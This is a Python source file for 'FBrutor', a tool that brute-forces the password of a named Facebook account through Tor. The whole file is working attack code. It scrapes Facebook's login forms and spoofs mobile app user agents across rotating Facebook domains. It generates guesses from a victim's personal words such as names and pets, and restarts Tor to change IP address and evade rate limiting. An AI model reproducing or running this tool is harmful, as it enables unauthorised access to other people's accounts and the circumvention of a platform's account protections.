#!/bin/python

# Author: 7wp81x
# github: https://github.com/7wp81x
# version: v1.0

from bs4 import BeautifulSoup
import subprocess
import itertools
import argparse
import requests
import random
import socks
import time
import sys
import os


loading = itertools.cycle(['\\', '|', '/', '-'])
clear = lambda: print('\r\033\143',end="")
user_agent_list = None
count = 0
total = 0
banner = """
\033[1;94m  _____ ____           \033[1;92m _____           \033[0m
\033[1;94m |  ___| __ ) _ __ _   \033[1;92m|_   _|__  _ __  \033[0m
\033[1;94m | |_  |  _ \\| '__| | | |\033[1;92m| |/ _ \| '__| \033[0m
\033[1;97m |  _| | |_) | |  | |_| |\033[1;92m| | (_) | |    \033[0m
\033[1;97m |_|   |____/|_|   \__,_|\033[1;92m|_|\___/|_|\033[0m

 \033[1;37;44m FBrutor v1.0, Coded by: 7wp81x (Github) \033[0m
"""
domains = [
		"x.facebook.com",
		"m.facebook.com",
		"mbasic.facebook.com",
		"d.facebook.com",
		"mtouch.facebook.com",
		"touch.facebook.com",
		"p.facebook.com",
		"mobile.facebook.com",
		"free.facebook.com",
	]

if os.path.exists('user_agents.txt'):
	with open('user_agents.txt') as UA:
		user_agent_list = UA.readlines()
		UA.close()
else:
	print("\033[1;92m[\033[1;97m*\033[1;92m]\033[1;97m User agent file not found!\033[0m")
	sys.exit(1)


class TorProxy:
	def __init__(self):
		print("\033[1;94m[\033[1;97m*\033[1;94m]\033[1;97m Starting TOR socks proxy...\033[0m")
		self.tor_process = None

	def run_tor(self):
		print("\033[1;94m[\033[1;97m*\033[1;94m]\033[1;97m Checking connection...\033[0m", end="")
		self.tor_process = subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
		while True:
			try:
				r = requests.get('https://check.torproject.org/', proxies={'http':'socks5://127.0.0.1:9050','https':'socks5://127.0.0.1:9050'}).text
				if "configured" in str(r):
					break
			except requests.exceptions.RequestException:
				pass
		print(" \033[1;91mOK\033[0m")
		time.sleep(1)
		return 1

	def stop_tor(self):
		if self.tor_process and self.tor_process.poll() is None:
			self.tor_process.terminate()
			self.tor_process.wait()

def generate_useragents():
	temporary_user_agent = random.choice(user_agent_list)
	version = random.choice([
		"387.0.0.0.70",
		"386.0.0.9.115",
		"385.0.0.11.112",
		"386.0.0.0.100",
		"386.0.0.0.84",
		"386.0.0.0.22",
		"384.0.0.8.114",
		"383.0.0.0.4",
		"382.0.0.11.115",
		"381.0.0.8.100",
		"380.0.0.14.112",
		"381.0.0.3.100",
		"381.0.0.0.76",
		"379.0.0.8.118",
		"380.0.0.0.105",
		"380.0.0.0.89",
		"380.0.0.0.22",
	])

	user_agent = temporary_user_agent.split('[')[-0].strip()+'[FBAN/EMA;FBLC/en_US;FBAV/'+version+']'
	return user_agent

def generate_password_combinations(wordlist,numlist=None):
	passlist = []
	if numlist == None:
		numlist = ['123','1234','12345','321','143','07','11']
	for number, word in itertools.product(numlist, wordlist):
		if word not in passlist and len(word) >= 6:
			passlist.append(word.strip())
		passlist.append(word.strip()+number.strip())

	return passlist

def check_password(username, password,notor=False):
	global count
	symbol = next(loading)
	domain = random.choice(domains)
	user_agent = generate_useragents()

	try:
		print_password = password
		if len(password) >= 13:
			print_password = password[0:9]+'...'
		percentage = (count + 1) / total * 100
		print(f"\033[1;94m[\033[1;92m{symbol}\033[1;94m]\033[1;97m Trying password \033[1;91m{count}\033[1;97m/\033[1;92m{total}\033[1;97m :\033[1;94m [\033[1;92m {print_password:<13}",end=f"\033[1;94m]\033[1;91m {percentage:.2f}%\r", flush=True)
		urls = random.choice([
			f'https://{domain}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
			f'https://{domain}/',
			f'https://{domain}/login/?refsrc=deprecated&_rdr'
			])

		proxy = {
			'http':'socks5h://127.0.0.1:9050',
			'https':'socks5h://127.0.0.1:9050',
		}

		headers = {
			'authority': domain,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
			'accept-encoding': 'gzip, deflate',
			'accept-language': 'en-US,en;q=0.9,de-DE;q=0.8,de;q=0.7,ca-ES;q=0.6,ca;q=0.5',
			'referer': f'http://{domain}/',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'user-agent': user_agent,
			'upgrade-insecure-requests': '1',
			'x-requested-with':'XMLHttpRequest',
		}

		data = {}

		req = requests.session()
		if not notor:
			req.proxies.update(proxy)
			subprocess.Popen(['killall', '-HUP', 'tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

		response = req.get(urls, allow_redirects=False,headers=headers)
		parser = BeautifulSoup(response.text,'html.parser')
		form = parser.find('form',method='post')

		hidden_inputs = form.find_all('input',{'name':True})

		for inputs in hidden_inputs:
			if 'sign_up' in str(inputs): continue
			data.update({f"{inputs.get('name')}":f"{inputs.get('value','')}"})

		headers.update({
			'content-type': 'application/x-www-form-urlencoded',
			'origin': f'https://{domain}',
			'pragma': 'no-cache',
			'referer': urls,
			'sec-fetch-dest': 'document',
			'sec-fetch-site': 'same-origin',
		})

		data.update({'email':username.strip(),'pass':password.strip()})

		post_url  = f"https://{domain}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8"

		if domain not in ['d.facebook.com','mbasic.facebook.com']:
			headers.update({'x-fb-lsd':data.get('lsd')})
			headers.update({'x-requested-with':'XMLHttpRequest'})
			post_url = f'https://{domain}/login/device-based/login/async/?refsrc=deprecated&lwv=100'

		req.post(post_url,headers=headers,data=data)
		check_cookie = req.cookies.get_dict()

		if "c_user" in str(check_cookie) or "checkpoint" in str(check_cookie):
			return "found"

		else:
			count += 1
			return "invalid"

	except requests.exceptions.RequestException:
		check_password(username, password,notor)
	except AttributeError:
		check_password(username, password,notor)
	except Exception as excpt:
		print(f"\n\033[1;91m[\033[1;97m!\033[1;91m] Critical error:\033[1;93m {excpt}\033[1;97m, retrying...\033[0m")
		check_password(username, password,notor)

def main():
	global total
	is_found = False
	parser = argparse.ArgumentParser(prog="fbrutor.py",description='Facebook bruteforce tool over TOR network')
	autogen_group = parser.add_argument_group('Autogen Arguments')
	autogen_group.add_argument('-wl', '--wordlist-autogen', metavar='<words>', help='Wordlist separated by comma Ex: firstname,lastname,petname (required)')
	autogen_group.add_argument('-nl', '--number-list', metavar='<numbers>', help='Additional numbers separated by comma Ex: 10,23,24 (optional)')
	main_group = parser.add_argument_group('Main arguments')
	main_group.add_argument('-w', '--wordlist',metavar="<wordlist>", help='Specify a password list file')
	main_group.add_argument('--autogen', action='store_true', help='Generate password list automatically')
	main_group.add_argument('--notor', action='store_true', help="Don't connect to tor network")
	main_group.add_argument('-t', '--target',metavar="<target>", required=True, help='Specify a target username')

	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit(1)

	args = parser.parse_args()

	if args.autogen:
		if not args.wordlist_autogen:
			parser.error('--wordlist-autogen is required with --autogen')
		clear()
		print(banner)
		if not args.notor:
			tor_proxy = TorProxy()
			tor_proxy.run_tor()
		number_list = None
		if args.number_list != None:
			number_list = args.number_list.split(',')
		password_list = generate_password_combinations(args.wordlist_autogen.split(","),number_list)
		print("\033[1;94m[\033[1;92m+\033[1;94m]\033[1;97m Password Generated: \033[1;92m"+"\033[1;97m,\033[1;92m ".join([x.strip() for x in password_list])+"\033[0m\n")
		total = len(password_list)
		for password in password_list:
			bruteforce = check_password(args.target,password,args.notor)
			if bruteforce == "found":
				print(f"\n\033[1;94m[\033[1;92m+\033[1;94m]\033[1;97m Password Found:\033[1;92m {password}\033[0m\n")
				is_found = True
				break
			else:
				continue

	else:
		if not args.wordlist:
			parser.error('--wordlist is required when --autogen is not present')
		if not os.path.exists(args.wordlist):
			print(f"\033[1;91m[\033[1;97m!\033[1;91m] File not found: \033[1;93m{args.wordlist}\033[0m")
			sys.exit(1)
		clear()
		print(banner)
		if not args.notor:
			tor_proxy = TorProxy()
			tor_proxy.run_tor()

		password_list = open(args.wordlist,'r').readlines()
		total = len(password_list)
		for password in password_list:
			password = password.strip()
			bruteforce = check_password(args.target,password,args.notor)
			if bruteforce == "found":
				print(f"\n\033[1;94m[\033[1;92m+\033[1;94m]\033[1;97m Password Found: \033[0;92m{password}\033[0m\n")
				is_found = True
				break
			else:
				continue

	if not is_found:
		print("\n\n\033[1;94m[\033[1;97m*\033[1;94m]\033[1;97m Password is not found in password list...\033[0m")
		print("\033[1;94m[\033[1;97m*\033[1;94m]\033[1;97m Try another password list...\033[0m")
	try:
		tor_proxy.stop_tor()
	except UnboundLocalError:
		sys.exit(1)

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		sys.exit("\n\033[1;94m[\033[1;91m-\033[1;94m] \033[1;97mAborting...\033[0m")
